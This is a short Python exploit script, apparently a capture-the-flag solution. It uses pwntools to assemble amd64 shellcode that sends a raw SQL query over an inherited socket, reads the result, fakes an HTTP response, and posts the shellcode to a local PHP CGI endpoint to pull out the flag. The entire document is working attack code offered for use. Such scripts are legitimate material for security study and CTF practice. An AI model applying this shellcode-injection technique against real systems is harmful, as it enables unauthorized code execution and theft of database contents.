#!/usr/bin/python

from pwn import *
import requests
import re

context.arch = "amd64"
context.os = "linux"
SQL = "SELECT * FROM flag;"
html = """X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\nContent-Type: text/html;charset=UTF-8\r\n\r\n<html><body></body></html>"""

def craft_payload():
    global SQL
    global html
    shellcode = shellcraft.echo(p16(len(SQL)) + "\x00\x00\x03" + SQL, 4)
    shellcode += shellcraft.read(4, 'rsp', 200)
    shellcode += shellcraft.pushstr(html)
    shellcode += shellcraft.write(1, 'rsp', 500)
    return shellcode

def main():
    res = requests.post("http://127.0.0.1:8080/cgi-bin/index.php", data={"shell": asm(craft_payload()) + "\x00"})
    flag = re.search("(OOO{.+})", res.text).groups()[0]
    log.success("FLAG: " + flag)
    
if __name__=="__main__":
    main()
